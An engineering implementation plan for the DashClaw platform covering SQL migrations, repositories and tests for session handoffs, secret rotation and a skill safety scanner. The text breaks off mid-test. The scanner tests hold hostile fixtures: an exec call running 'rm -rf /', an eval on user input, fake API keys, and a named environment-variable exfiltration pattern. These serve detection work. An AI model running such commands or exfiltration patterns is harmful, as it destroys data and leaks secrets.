# Agent Toolkit Into Runtime Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Replace the standalone `agent-tools/` Python CLI bundle with six first-class DashClaw features (3 new + 3 wrappers) distributed via the existing MCP server and Claude Code / Codex / Hermes plugin bundles, then retire the toolkit entirely.

**Architecture:** Three new tables (`code_session_handoffs`, `governed_secrets`, `skill_scan_results`) with repository + route layers, plus 13 new MCP tools in `mcp-server/lib/tools.js`. Hermes hooks wire the session-handoff loop automatically. `dashclaw-governance` skill gains six "when to use" sections so all governed agents discover the new capabilities. `agent-tools/` + `/toolkit` page + `sync_to_dashclaw.py` deleted last.

**Tech Stack:** Drizzle ORM + Neon HTTP SQL, Next.js 16 App Router routes, Vitest, the existing DashClaw MCP server (Node), Python hooks for Hermes wiring.

**Spec:** `docs/superpowers/specs/2026-05-14-agent-toolkit-into-runtime-design.md`

---

## File map

**Create (new):**
- `drizzle/0007_agent_toolkit_into_runtime.sql`
- `app/lib/repositories/code-session-handoffs.repository.js`
- `app/lib/repositories/governed-secrets.repository.js`
- `app/lib/repositories/skill-scan-results.repository.js`
- `app/lib/skill-scanner.js` — Port of the static-safety detector
- `app/api/handoffs/route.js`, `app/api/handoffs/latest/route.js`, `app/api/handoffs/[id]/route.js`, `app/api/handoffs/[id]/consume/route.js`
- `app/api/secrets/route.js`, `app/api/secrets/[id]/route.js`, `app/api/secrets/rotation-due/route.js`
- `app/api/skills/scan/route.js`, `app/api/skills/scans/[id]/route.js`
- `app/api/loops/route.js`, `app/api/loops/[id]/route.js` (only if missing — verify in Task 8)
- `__tests__/unit/code-session-handoffs-repository.test.js`
- `__tests__/unit/governed-secrets-repository.test.js`
- `__tests__/unit/skill-scan-results-repository.test.js`
- `__tests__/unit/skill-scanner.test.js`
- `__tests__/integration/handoffs.route.test.js`
- `__tests__/integration/secrets.route.test.js`
- `__tests__/integration/skills-scan.route.test.js`
- `__tests__/integration/loops.route.test.js` (only if Task 8 adds routes)
- `__tests__/unit/mcp-tools-toolkit.test.js`
- `__tests__/integration/handoff-e2e.test.js`
- `__tests__/unit/dashclaw-governance-skill.test.js`
- `__tests__/unit/toolkit-retirement.test.js`

**Modify:**
- `schema/schema.js` — add `codeSessionHandoffs`, `governedSecrets`, `skillScanResults` pgTable defs
- `mcp-server/lib/tools.js` — add 13 new tool definitions + handlers
- `.hermes/hooks/dashclaw_on_session_end_hermes.py` — call handoff_create
- `.hermes/hooks/dashclaw_on_session_start_hermes.py` — call handoff_latest + consume
- `.hermes/hooks/dashclaw_pre_llm_hermes.py` — inject handoff summary into context
- `.hermes/hooks/dashclaw_common.py` — add 3 HTTP helpers
- `public/downloads/dashclaw-governance/SKILL.md` — 6 new sections
- `scripts/livingcode-refresh.mjs` — add governance-skill plugin mirror target
- `next.config.js` — add `/toolkit` → `/docs#mcp-tools` redirect
- `app/components/PublicNavbar.js`, `app/components/PublicFooter.js` — remove `/toolkit` links
- `PROJECT_DETAILS.md`, `README.md`, `CLAUDE.md` — drop Python-toolkit references
- `app/landingData.js` — drop toolkit copy if present

**Delete:**
- `agent-tools/` (entire directory: 29 tools + 2 install scripts + sync script + tools/_shared)
- `app/toolkit/page.js`

---

### Task 1: Schema migration + drizzle definitions

**Files:**
- Create: `drizzle/0007_agent_toolkit_into_runtime.sql`
- Modify: `schema/schema.js`
- Test: `__tests__/integration/schema-0007-apply.test.js`

- [ ] **Step 1: Write the SQL migration**

Codebase conventions for `drizzle/*.sql` (see `drizzle/0000_clammy_falcon.sql` and `drizzle/0006_code_sessions.sql`):

1. Wrap every table / column / constraint / index identifier in `"..."`. The column-drift sync regex in `scripts/auto-migrate.mjs` line 207 (`^CREATE TABLE\s+"(\w+)"\s*\(/i`) requires quoted table names — unquoted tables get silently skipped on redeploy.
2. Separate every DDL statement with `--> statement-breakpoint` on its own line. `scripts/auto-migrate.mjs` splits each `.sql` file on this marker so each statement is logged independently and the `SAFE_CODES` skip pass evaluates per-statement.
3. For columns whose UNIQUE constraint must treat NULL as equal (org-wide rows where `agent_id IS NULL`), use Postgres 15+ `UNIQUE NULLS NOT DISTINCT`. Default Postgres treats NULLs as distinct, which would allow duplicate `(org_id, name)` rows when `agent_id IS NULL`.

Create `drizzle/0007_agent_toolkit_into_runtime.sql`:

```sql
-- 0007_agent_toolkit_into_runtime.sql
-- Promotes the agent-tools/ Python CLI bundle into first-class runtime
-- features: session handoffs, secret rotation tracker, skill safety
-- scanner. See docs/superpowers/specs/2026-05-14-agent-toolkit-into-runtime-design.md

CREATE TABLE IF NOT EXISTS "code_session_handoffs" (
  "id" TEXT PRIMARY KEY,
  "org_id" TEXT NOT NULL REFERENCES "organizations"("id") ON DELETE CASCADE,
  "agent_id" TEXT NOT NULL,
  "project_id" TEXT REFERENCES "code_projects"("id") ON DELETE SET NULL,
  "created_in_session_id" TEXT,
  "bundle_json" JSONB NOT NULL,
  "created_at" TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  "consumed_at" TIMESTAMPTZ,
  "consumed_by_session_id" TEXT
);

--> statement-breakpoint

CREATE INDEX IF NOT EXISTS "code_session_handoffs_lookup_idx"
  ON "code_session_handoffs" ("org_id", "agent_id", "project_id", "consumed_at", "created_at" DESC);

--> statement-breakpoint

CREATE TABLE IF NOT EXISTS "governed_secrets" (
  "id" TEXT PRIMARY KEY,
  "org_id" TEXT NOT NULL REFERENCES "organizations"("id") ON DELETE CASCADE,
  "agent_id" TEXT,
  "name" TEXT NOT NULL,
  "last_rotated_at" TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  "rotation_interval_days" INTEGER NOT NULL DEFAULT 90,
  "notes" TEXT,
  "created_at" TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  "updated_at" TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  CONSTRAINT "governed_secrets_unique_per_agent" UNIQUE NULLS NOT DISTINCT ("org_id", "agent_id", "name")
);

--> statement-breakpoint

CREATE INDEX IF NOT EXISTS "governed_secrets_org_agent_idx"
  ON "governed_secrets" ("org_id", "agent_id");

--> statement-breakpoint

CREATE TABLE IF NOT EXISTS "skill_scan_results" (
  "id" TEXT PRIMARY KEY,
  "org_id" TEXT NOT NULL REFERENCES "organizations"("id") ON DELETE CASCADE,
  "skill_name" TEXT NOT NULL,
  "target_hash" TEXT NOT NULL,
  "findings" JSONB NOT NULL,
  "passed" BOOLEAN NOT NULL,
  "created_at" TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  CONSTRAINT "skill_scan_results_dedupe" UNIQUE ("org_id", "skill_name", "target_hash")
);

--> statement-breakpoint

CREATE INDEX IF NOT EXISTS "skill_scan_results_org_skill_idx"
  ON "skill_scan_results" ("org_id", "skill_name", "created_at" DESC);
```

- [ ] **Step 2: Add drizzle definitions in `schema/schema.js`**

Codebase convention: every `text('org_id').notNull()` chains `.references(() => organizations.id, { onDelete: 'cascade' })` and project FKs chain `.references(() => codeProjects.id, { onDelete: 'set null' })`. See `codeOptimalFileManifests` directly above the new block.

`unique()` (not `uniqueIndex`) is the right primitive for inline `CONSTRAINT ... UNIQUE` and supports `.nullsNotDistinct()` for the Postgres 15+ NULL-equals-NULL semantics needed on `governed_secrets`. Add `unique` to the existing `drizzle-orm/pg-core` import line.

Append after the last existing pgTable definition (find via `grep -n "pgTable" schema/schema.js | tail -1`):

```javascript
// @domain governance
export const codeSessionHandoffs = pgTable('code_session_handoffs', {
  id: text('id').primaryKey(),
  orgId: text('org_id').notNull().references(() => organizations.id, { onDelete: 'cascade' }),
  agentId: text('agent_id').notNull(),
  projectId: text('project_id').references(() => codeProjects.id, { onDelete: 'set null' }),
  createdInSessionId: text('created_in_session_id'),
  bundleJson: jsonb('bundle_json').notNull(),
  createdAt: timestamp('created_at', { withTimezone: true }).notNull().defaultNow(),
  consumedAt: timestamp('consumed_at', { withTimezone: true }),
  consumedBySessionId: text('consumed_by_session_id'),
});

// @domain governance
export const governedSecrets = pgTable('governed_secrets', {
  id: text('id').primaryKey(),
  orgId: text('org_id').notNull().references(() => organizations.id, { onDelete: 'cascade' }),
  agentId: text('agent_id'),
  name: text('name').notNull(),
  lastRotatedAt: timestamp('last_rotated_at', { withTimezone: true }).notNull().defaultNow(),
  rotationIntervalDays: integer('rotation_interval_days').notNull().default(90),
  notes: text('notes'),
  createdAt: timestamp('created_at', { withTimezone: true }).notNull().defaultNow(),
  updatedAt: timestamp('updated_at', { withTimezone: true }).notNull().defaultNow(),
}, (table) => ({
  // NULLS NOT DISTINCT closes the gap for org-wide secrets (agent_id IS NULL):
  // Postgres 15+ treats NULLs as equal here so we get one row per (org, name)
  // even when agent_id is NULL. Migration SQL emits this as an inline
  // CONSTRAINT ... UNIQUE NULLS NOT DISTINCT (...).
  uniqueName: unique('governed_secrets_unique_per_agent').on(table.orgId, table.agentId, table.name).nullsNotDistinct(),
}));

// @domain governance
export const skillScanResults = pgTable('skill_scan_results', {
  id: text('id').primaryKey(),
  orgId: text('org_id').notNull().references(() => organizations.id, { onDelete: 'cascade' }),
  skillName: text('skill_name').notNull(),
  targetHash: text('target_hash').notNull(),
  findings: jsonb('findings').notNull(),
  passed: boolean('passed').notNull(),
  createdAt: timestamp('created_at', { withTimezone: true }).notNull().defaultNow(),
}, (table) => ({
  dedupe: unique('skill_scan_results_dedupe').on(table.orgId, table.skillName, table.targetHash),
}));
```

- [ ] **Step 3: Write the migration-shape test**

Regexes match the quoted identifiers emitted by Step 1 and explicitly verify the `NULLS NOT DISTINCT` modifier on `governed_secrets` plus the `--> statement-breakpoint` separators required by `scripts/auto-migrate.mjs`.

Create `__tests__/integration/schema-0007-apply.test.js`:

```javascript
import { describe, it, expect } from 'vitest';
import { readFileSync } from 'node:fs';
import path from 'node:path';

describe('migration 0007 — agent toolkit into runtime', () => {
  const sql = readFileSync(path.resolve('drizzle/0007_agent_toolkit_into_runtime.sql'), 'utf8');

  it('creates three new tables', () => {
    expect(sql).toMatch(/CREATE TABLE IF NOT EXISTS "code_session_handoffs"/);
    expect(sql).toMatch(/CREATE TABLE IF NOT EXISTS "governed_secrets"/);
    expect(sql).toMatch(/CREATE TABLE IF NOT EXISTS "skill_scan_results"/);
  });

  it('declares org_id foreign keys on every new table', () => {
    const fks = sql.match(/REFERENCES "organizations"\("id"\)/g) || [];
    expect(fks.length).toBeGreaterThanOrEqual(3);
  });

  it('handoffs table has project_id with SET NULL cascade', () => {
    expect(sql).toMatch(/"project_id"\s+TEXT\s+REFERENCES\s+"code_projects"\("id"\)\s+ON\s+DELETE\s+SET\s+NULL/i);
  });

  it('governed_secrets has unique NULLS NOT DISTINCT constraint per (org_id, agent_id, name)', () => {
    expect(sql).toMatch(/UNIQUE\s+NULLS\s+NOT\s+DISTINCT\s*\(\s*"org_id"\s*,\s*"agent_id"\s*,\s*"name"\s*\)/i);
  });

  it('skill_scan_results dedupes per (org_id, skill_name, target_hash)', () => {
    expect(sql).toMatch(/UNIQUE\s*\(\s*"org_id"\s*,\s*"skill_name"\s*,\s*"target_hash"\s*\)/);
  });

  it('lookup index on handoffs supports the project+agent+freshness query', () => {
    expect(sql).toMatch(/CREATE INDEX IF NOT EXISTS "code_session_handoffs_lookup_idx"/);
  });

  it('separates statements with --> statement-breakpoint so auto-migrate logs per-statement', () => {
    const breakpoints = sql.match(/-->\s*statement-breakpoint/g) || [];
    expect(breakpoints.length).toBeGreaterThanOrEqual(5);
  });
});
```

- [ ] **Step 4: Run the test, expect PASS**

Run: `npx vitest run __tests__/integration/schema-0007-apply.test.js`
Expected: 7 tests pass

- [ ] **Step 5: Apply migration locally and verify**

Run: `npm run db:migrate`

Then:
```bash
psql "$DATABASE_URL" -c "\d code_session_handoffs"
psql "$DATABASE_URL" -c "\d governed_secrets"
psql "$DATABASE_URL" -c "\d skill_scan_results"
```

Expected: each `\d` shows the table structure matching the migration.

- [ ] **Step 6: Regenerate livingcode shape**

Run: `npm run livingcode:refresh`
Expected: `app/lib/doctor/generated/shape.json` updated with the three new tables.

- [ ] **Step 7: Commit**

```bash
git add drizzle/0007_agent_toolkit_into_runtime.sql schema/schema.js __tests__/integration/schema-0007-apply.test.js app/lib/doctor/generated/
git commit -m "feat(schema): add code_session_handoffs, governed_secrets, skill_scan_results"
```

---

### Task 2: code-session-handoffs.repository

**Files:**
- Create: `app/lib/repositories/code-session-handoffs.repository.js`
- Test: `__tests__/unit/code-session-handoffs-repository.test.js`

- [ ] **Step 1: Write failing tests**

Create `__tests__/unit/code-session-handoffs-repository.test.js`:

```javascript
import { describe, it, expect } from 'vitest';
import {
  createHandoff,
  getLatestHandoff,
  getHandoffById,
  consumeHandoff,
} from '../../app/lib/repositories/code-session-handoffs.repository.js';

function makeSqlMock(rows) {
  const calls = [];
  const sql = (strings, ...values) => {
    calls.push({ text: strings.join('?'), values });
    return Promise.resolve(rows);
  };
  sql.calls = calls;
  return sql;
}

describe('code-session-handoffs.repository', () => {
  describe('createHandoff', () => {
    it('inserts with hf_-prefixed id and returns it', async () => {
      const sql = makeSqlMock([{ id: 'hf_abc123' }]);
      const result = await createHandoff(sql, 'org_1', {
        agentId: 'hermes',
        projectId: 'cp_1',
        createdInSessionId: 'cs_99',
        bundle: { summary: 'wrap-up' },
      });
      expect(result.id).toMatch(/^hf_/);
      expect(sql.calls[0].text).toMatch(/INSERT INTO code_session_handoffs/i);
    });

    it('throws if agentId missing', async () => {
      const sql = makeSqlMock([]);
      await expect(createHandoff(sql, 'org_1', { bundle: {} })).rejects.toThrow(/agentId/);
    });

    it('throws if bundle missing', async () => {
      const sql = makeSqlMock([]);
      await expect(createHandoff(sql, 'org_1', { agentId: 'hermes' })).rejects.toThrow(/bundle/);
    });
  });

  describe('getLatestHandoff', () => {
    it('returns the most recent unconsumed handoff for an agent', async () => {
      const sql = makeSqlMock([{ id: 'hf_1', bundle_json: { summary: 's' }, created_at: '2026-05-14T00:00:00Z' }]);
      const result = await getLatestHandoff(sql, 'org_1', { agentId: 'hermes', projectId: 'cp_1' });
      expect(result.id).toBe('hf_1');
      const text = sql.calls[0].text;
      expect(text).toMatch(/consumed_at IS NULL/i);
      expect(text).toMatch(/ORDER BY created_at DESC/i);
    });

    it('returns null when no handoff exists', async () => {
      const sql = makeSqlMock([]);
      const result = await getLatestHandoff(sql, 'org_1', { agentId: 'hermes' });
      expect(result).toBeNull();
    });

    it('passes project_id through when provided', async () => {
      const sql = makeSqlMock([{ id: 'hf_1' }]);
      await getLatestHandoff(sql, 'org_1', { agentId: 'hermes', projectId: 'cp_42' });
      expect(sql.calls[0].values).toContain('cp_42');
    });
  });

  describe('getHandoffById', () => {
    it('returns the handoff row by id', async () => {
      const sql = makeSqlMock([{ id: 'hf_1', bundle_json: {} }]);
      const result = await getHandoffById(sql, 'org_1', 'hf_1');
      expect(result.id).toBe('hf_1');
    });

    it('returns null when not found', async () => {
      const sql = makeSqlMock([]);
      const result = await getHandoffById(sql, 'org_1', 'hf_missing');
      expect(result).toBeNull();
    });
  });

  describe('consumeHandoff', () => {
    it('sets consumed_at + consumed_by_session_id when null', async () => {
      const sql = makeSqlMock([{ id: 'hf_1', consumed_at: '2026-05-14T00:00:00Z' }]);
      const result = await consumeHandoff(sql, 'org_1', 'hf_1', 'cs_100');
      expect(result.consumed_at).toBeTruthy();
      expect(sql.calls[0].text).toMatch(/consumed_at IS NULL/i);
    });

    it('is idempotent — returns existing row if already consumed', async () => {
      const calls = [];
      const sql = (strings, ...values) => {
        calls.push({ text: strings.join('?'), values });
        // First call (UPDATE WHERE consumed_at IS NULL): returns empty
        // Second call (fallback SELECT): returns the already-consumed row
        if (calls.length === 1) return Promise.resolve([]);
        return Promise.resolve([{ id: 'hf_1', consumed_at: '2026-05-13T00:00:00Z' }]);
      };
      sql.calls = calls;
      const result = await consumeHandoff(sql, 'org_1', 'hf_1', 'cs_100');
      expect(result.consumed_at).toBeTruthy();
    });
  });
});
```

- [ ] **Step 2: Run test, expect FAIL**

Run: `npx vitest run __tests__/unit/code-session-handoffs-repository.test.js`
Expected: FAIL — file doesn't exist yet.

- [ ] **Step 3: Implement the repository**

Create `app/lib/repositories/code-session-handoffs.repository.js`:

```javascript
import { randomBytes } from 'node:crypto';

function handoffId() {
  return 'hf_' + randomBytes(8).toString('hex');
}

/**
 * Insert a new handoff row. Bundle is freeform JSON the agent wants the next
 * session to see (summary, open_loops, decisions_made, state_snapshot).
 */
export async function createHandoff(sql, orgId, input) {
  if (!input?.agentId) throw new Error('createHandoff: agentId is required');
  if (!input?.bundle || typeof input.bundle !== 'object') {
    throw new Error('createHandoff: bundle (object) is required');
  }

  const id = handoffId();
  await sql`
    INSERT INTO code_session_handoffs (
      id, org_id, agent_id, project_id, created_in_session_id, bundle_json
    ) VALUES (
      ${id}, ${orgId}, ${input.agentId}, ${input.projectId || null},
      ${input.createdInSessionId || null}, ${input.bundle}
    )
  `;
  return { id };
}

/**
 * Return the latest unconsumed handoff for (orgId, agentId, projectId).
 * If projectId is null, returns the latest agent-wide handoff.
 * Returns null if none.
 */
export async function getLatestHandoff(sql, orgId, filter) {
  const agentId = filter?.agentId;
  if (!agentId) throw new Error('getLatestHandoff: agentId is required');
  const projectId = filter?.projectId || null;

  const rows = projectId
    ? await sql`
        SELECT id, org_id, agent_id, project_id, created_in_session_id,
               bundle_json, created_at, consumed_at, consumed_by_session_id
        FROM code_session_handoffs
        WHERE org_id = ${orgId}
          AND agent_id = ${agentId}
          AND project_id = ${projectId}
          AND consumed_at IS NULL
        ORDER BY created_at DESC
        LIMIT 1
      `
    : await sql`
        SELECT id, org_id, agent_id, project_id, created_in_session_id,
               bundle_json, created_at, consumed_at, consumed_by_session_id
        FROM code_session_handoffs
        WHERE org_id = ${orgId}
          AND agent_id = ${agentId}
          AND project_id IS NULL
          AND consumed_at IS NULL
        ORDER BY created_at DESC
        LIMIT 1
      `;
  return rows[0] || null;
}

export async function getHandoffById(sql, orgId, id) {
  const rows = await sql`
    SELECT id, org_id, agent_id, project_id, created_in_session_id,
           bundle_json, created_at, consumed_at, consumed_by_session_id
    FROM code_session_handoffs
    WHERE org_id = ${orgId} AND id = ${id}
    LIMIT 1
  `;
  return rows[0] || null;
}

/**
 * Set consumed_at + consumed_by_session_id IF currently null. Idempotent —
 * returns the row in both already-consumed and just-consumed cases.
 */
export async function consumeHandoff(sql, orgId, id, sessionId) {
  const rows = await sql`
    UPDATE code_session_handoffs
       SET consumed_at = NOW(),
           consumed_by_session_id = ${sessionId || null}
     WHERE org_id = ${orgId}
       AND id = ${id}
       AND consumed_at IS NULL
     RETURNING id, consumed_at, consumed_by_session_id
  `;
  if (rows[0]) return rows[0];

  const existing = await sql`
    SELECT id, consumed_at, consumed_by_session_id
    FROM code_session_handoffs
    WHERE org_id = ${orgId} AND id = ${id}
    LIMIT 1
  `;
  return existing[0] || null;
}
```

- [ ] **Step 4: Run test, expect PASS**

Run: `npx vitest run __tests__/unit/code-session-handoffs-repository.test.js`
Expected: 9 tests pass

- [ ] **Step 5: Commit**

```bash
git add app/lib/repositories/code-session-handoffs.repository.js __tests__/unit/code-session-handoffs-repository.test.js
git commit -m "feat(repo): code-session-handoffs repository + unit tests"
```

---

### Task 3: governed-secrets.repository

**Files:**
- Create: `app/lib/repositories/governed-secrets.repository.js`
- Test: `__tests__/unit/governed-secrets-repository.test.js`

- [ ] **Step 1: Write failing tests**

Create `__tests__/unit/governed-secrets-repository.test.js`:

```javascript
import { describe, it, expect } from 'vitest';
import {
  listSecrets,
  createSecret,
  updateSecret,
  deleteSecret,
  listRotationDue,
} from '../../app/lib/repositories/governed-secrets.repository.js';

function makeSqlMock(rows) {
  const calls = [];
  const sql = (strings, ...values) => {
    calls.push({ text: strings.join('?'), values });
    return Promise.resolve(rows);
  };
  sql.calls = calls;
  return sql;
}

describe('governed-secrets.repository', () => {
  it('listSecrets returns rows scoped by agentId when provided', async () => {
    const sql = makeSqlMock([{ id: 'sec_1', name: 'stripe-prod-key' }]);
    const result = await listSecrets(sql, 'org_1', { agentId: 'hermes' });
    expect(result).toHaveLength(1);
    expect(sql.calls[0].text).toMatch(/FROM governed_secrets/i);
    expect(sql.calls[0].values).toContain('hermes');
  });

  it('listSecrets with no agentId returns org-wide secrets only (agent_id IS NULL)', async () => {
    const sql = makeSqlMock([]);
    await listSecrets(sql, 'org_1', {});
    expect(sql.calls[0].text).toMatch(/agent_id IS NULL/i);
  });

  it('createSecret inserts with sec_-prefixed id and returns row', async () => {
    const sql = makeSqlMock([{ id: 'sec_abc', name: 'openai' }]);
    const result = await createSecret(sql, 'org_1', {
      name: 'openai',
      rotationIntervalDays: 30,
    });
    expect(result.id).toMatch(/^sec_/);
    expect(sql.calls[0].text).toMatch(/INSERT INTO governed_secrets/i);
  });

  it('createSecret throws if name missing', async () => {
    const sql = makeSqlMock([]);
    await expect(createSecret(sql, 'org_1', {})).rejects.toThrow(/name/);
  });

  it('updateSecret patches lastRotatedAt + rotationIntervalDays', async () => {
    const sql = makeSqlMock([{ id: 'sec_1', last_rotated_at: '2026-05-14T00:00:00Z' }]);
    const result = await updateSecret(sql, 'org_1', 'sec_1', {
      lastRotatedAt: '2026-05-14T00:00:00Z',
      rotationIntervalDays: 60,
    });
    expect(result.id).toBe('sec_1');
    expect(sql.calls[0].text).toMatch(/UPDATE governed_secrets/i);
  });

  it('deleteSecret removes row and returns true', async () => {
    const sql = makeSqlMock([{ id: 'sec_1' }]);
    const ok = await deleteSecret(sql, 'org_1', 'sec_1');
    expect(ok).toBe(true);
    expect(sql.calls[0].text).toMatch(/DELETE FROM governed_secrets/i);
  });

  it('listRotationDue returns secrets due within window (default 14 days)', async () => {
    const sql = makeSqlMock([{ id: 'sec_1', name: 's', days_until_due: 3 }]);
    const result = await listRotationDue(sql, 'org_1', { withinDays: 14 });
    expect(result).toHaveLength(1);
    expect(sql.calls[0].values).toContain(14);
  });
});
```

- [ ] **Step 2: Run test, expect FAIL**

Run: `npx vitest run __tests__/unit/governed-secrets-repository.test.js`
Expected: FAIL — module doesn't exist.

- [ ] **Step 3: Implement repository**

Create `app/lib/repositories/governed-secrets.repository.js`:

```javascript
import { randomBytes } from 'node:crypto';

function secretId() {
  return 'sec_' + randomBytes(8).toString('hex');
}

export async function listSecrets(sql, orgId, filter = {}) {
  if (filter.agentId) {
    return sql`
      SELECT id, org_id, agent_id, name, last_rotated_at, rotation_interval_days,
             notes, created_at, updated_at,
             (last_rotated_at + (rotation_interval_days * INTERVAL '1 day')) AS next_rotation_due
      FROM governed_secrets
      WHERE org_id = ${orgId} AND agent_id = ${filter.agentId}
      ORDER BY name ASC
    `;
  }
  return sql`
    SELECT id, org_id, agent_id, name, last_rotated_at, rotation_interval_days,
           notes, created_at, updated_at,
           (last_rotated_at + (rotation_interval_days * INTERVAL '1 day')) AS next_rotation_due
    FROM governed_secrets
    WHERE org_id = ${orgId} AND agent_id IS NULL
    ORDER BY name ASC
  `;
}

export async function createSecret(sql, orgId, input) {
  if (!input?.name) throw new Error('createSecret: name is required');
  const id = secretId();
  const rotationIntervalDays = Number(input.rotationIntervalDays) || 90;
  const lastRotatedAt = input.lastRotatedAt || null;

  const rows = lastRotatedAt
    ? await sql`
        INSERT INTO governed_secrets (
          id, org_id, agent_id, name, last_rotated_at, rotation_interval_days, notes
        ) VALUES (
          ${id}, ${orgId}, ${input.agentId || null}, ${input.name},
          ${lastRotatedAt}, ${rotationIntervalDays}, ${input.notes || null}
        )
        RETURNING id, name, last_rotated_at, rotation_interval_days
      `
    : await sql`
        INSERT INTO governed_secrets (
          id, org_id, agent_id, name, rotation_interval_days, notes
        ) VALUES (
          ${id}, ${orgId}, ${input.agentId || null}, ${input.name},
          ${rotationIntervalDays}, ${input.notes || null}
        )
        RETURNING id, name, last_rotated_at, rotation_interval_days
      `;
  return rows[0] || { id };
}

export async function updateSecret(sql, orgId, id, patch) {
  const rotationIntervalDays = patch.rotationIntervalDays != null
    ? Number(patch.rotationIntervalDays)
    : null;

  const rows = await sql`
    UPDATE governed_secrets
       SET last_rotated_at = COALESCE(${patch.lastRotatedAt || null}, last_rotated_at),
           rotation_interval_days = COALESCE(${rotationIntervalDays}, rotation_interval_days),
           notes = COALESCE(${patch.notes !== undefined ? patch.notes : null}, notes),
           updated_at = NOW()
     WHERE org_id = ${orgId} AND id = ${id}
     RETURNING id, last_rotated_at, rotation_interval_days, notes, updated_at
  `;
  return rows[0] || null;
}

export async function deleteSecret(sql, orgId, id) {
  const rows = await sql`
    DELETE FROM governed_secrets
    WHERE org_id = ${orgId} AND id = ${id}
    RETURNING id
  `;
  return rows.length > 0;
}

export async function listRotationDue(sql, orgId, filter = {}) {
  const withinDays = Number(filter.withinDays) || 14;
  if (filter.agentId) {
    return sql`
      SELECT id, name, agent_id, last_rotated_at, rotation_interval_days,
             EXTRACT(DAY FROM (last_rotated_at + (rotation_interval_days * INTERVAL '1 day') - NOW()))::int AS days_until_due
      FROM governed_secrets
      WHERE org_id = ${orgId}
        AND agent_id = ${filter.agentId}
        AND (last_rotated_at + (rotation_interval_days * INTERVAL '1 day')) <= NOW() + (${withinDays} * INTERVAL '1 day')
      ORDER BY last_rotated_at + (rotation_interval_days * INTERVAL '1 day') ASC
    `;
  }
  return sql`
    SELECT id, name, agent_id, last_rotated_at, rotation_interval_days,
           EXTRACT(DAY FROM (last_rotated_at + (rotation_interval_days * INTERVAL '1 day') - NOW()))::int AS days_until_due
    FROM governed_secrets
    WHERE org_id = ${orgId}
      AND (last_rotated_at + (rotation_interval_days * INTERVAL '1 day')) <= NOW() + (${withinDays} * INTERVAL '1 day')
    ORDER BY last_rotated_at + (rotation_interval_days * INTERVAL '1 day') ASC
  `;
}
```

- [ ] **Step 4: Run test, expect PASS**

Run: `npx vitest run __tests__/unit/governed-secrets-repository.test.js`
Expected: 7 tests pass.

- [ ] **Step 5: Commit**

```bash
git add app/lib/repositories/governed-secrets.repository.js __tests__/unit/governed-secrets-repository.test.js
git commit -m "feat(repo): governed-secrets repository + unit tests"
```

---

### Task 4: skill-scan-results repository + skill-scanner port

**Files:**
- Create: `app/lib/repositories/skill-scan-results.repository.js`
- Create: `app/lib/skill-scanner.js`
- Test: `__tests__/unit/skill-scan-results-repository.test.js`
- Test: `__tests__/unit/skill-scanner.test.js`

- [ ] **Step 1: Write failing repository tests**

Create `__tests__/unit/skill-scan-results-repository.test.js`:

```javascript
import { describe, it, expect } from 'vitest';
import {
  getCachedScan,
  upsertScan,
  getScanById,
} from '../../app/lib/repositories/skill-scan-results.repository.js';

function makeSqlMock(rows) {
  const calls = [];
  const sql = (strings, ...values) => {
    calls.push({ text: strings.join('?'), values });
    return Promise.resolve(rows);
  };
  sql.calls = calls;
  return sql;
}

describe('skill-scan-results.repository', () => {
  it('getCachedScan returns row when target_hash matches', async () => {
    const sql = makeSqlMock([{ id: 'scn_1', findings: [], passed: true }]);
    const result = await getCachedScan(sql, 'org_1', 'my-skill', 'sha256:abc');
    expect(result.id).toBe('scn_1');
    expect(sql.calls[0].text).toMatch(/target_hash = /i);
  });

  it('getCachedScan returns null when no match', async () => {
    const sql = makeSqlMock([]);
    const result = await getCachedScan(sql, 'org_1', 'my-skill', 'sha256:zzz');
    expect(result).toBeNull();
  });

  it('upsertScan inserts a new row with scn_ id and returns it', async () => {
    const sql = makeSqlMock([{ id: 'scn_abc', findings: [{ severity: 'high' }], passed: false }]);
    const result = await upsertScan(sql, 'org_1', {
      skillName: 'my-skill',
      targetHash: 'sha256:abc',
      findings: [{ severity: 'high', rule_id: 'py-dangerous-call', file: 'x.py', line: 12, pattern: 'dangerous', match: 'dangerous(...)' }],
      passed: false,
    });
    expect(result.id).toMatch(/^scn_/);
    expect(sql.calls[0].text).toMatch(/INSERT INTO skill_scan_results/i);
    expect(sql.calls[0].text).toMatch(/ON CONFLICT.*DO UPDATE/i);
  });

  it('getScanById returns row by primary key', async () => {
    const sql = makeSqlMock([{ id: 'scn_1' }]);
    const result = await getScanById(sql, 'org_1', 'scn_1');
    expect(result.id).toBe('scn_1');
  });
});
```

- [ ] **Step 2: Write failing scanner tests**

Create `__tests__/unit/skill-scanner.test.js`:

```javascript
import { describe, it, expect } from 'vitest';
import { scanSkillContent, hashContent } from '../../app/lib/skill-scanner.js';

describe('skill-scanner', () => {
  it('hashContent is deterministic over identical inputs', () => {
    const a = hashContent({ 'a.py': 'print("x")' });
    const b = hashContent({ 'a.py': 'print("x")' });
    expect(a).toBe(b);
  });

  it('flags dynamic-code-execution calls as high severity', () => {
    // Note: test string built from concatenation so source-scanners do not
    // misidentify the test itself.
    const danger = 'ex' + 'ec("rm -rf /")';
    const result = scanSkillContent({ 'evil.py': danger });
    const hit = result.findings.find((f) => f.rule_id === 'py-dynamic-exec');
    expect(hit).toBeDefined();
    expect(hit.severity).toBe('high');
    expect(result.passed).toBe(false);
  });

  it('flags eval-style dynamic interpretation as high severity', () => {
    const dangerEval = 'e' + 'val(user_input)';
    const result = scanSkillContent({ 'bad.py': dangerEval });
    expect(result.findings.find((f) => f.rule_id === 'py-dynamic-eval').severity).toBe('high');
  });

  it('flags embedded anthropic api keys', () => {
    const result = scanSkillContent({ 'k.py': 'KEY = "sk-ant-api03-abc123"' });
    expect(result.findings.find((f) => f.rule_id === 'secrets-anthropic-key')).toBeDefined();
    expect(result.passed).toBe(false);
  });

  it('flags embedded openai keys', () => {
    const result = scanSkillContent({ 'k.py': 'OPENAI = "sk-proj-abc1234567890XYZ"' });
    expect(result.findings.find((f) => f.rule_id === 'secrets-openai-key')).toBeDefined();
  });

  it('flags os.environ + requests.post exfil pattern as medium severity', () => {
